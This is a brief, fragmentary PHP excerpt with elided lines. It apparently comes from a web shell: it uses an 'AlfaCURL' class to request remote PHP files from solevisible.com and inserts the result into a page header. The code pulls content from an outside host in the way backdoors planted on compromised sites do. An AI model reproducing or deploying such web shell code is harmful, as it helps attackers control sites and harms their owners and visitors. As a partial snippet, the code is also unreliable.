...
$curl = new AlfaCURL();
$content = $curl->Send("http://solevisible.com/mat.php");
...
echo '<div class="header">';
$news = new AlfaCURL();
$about_us = $news->Send("http://solevisible.com/tus.php");
if(empty($about_us)){
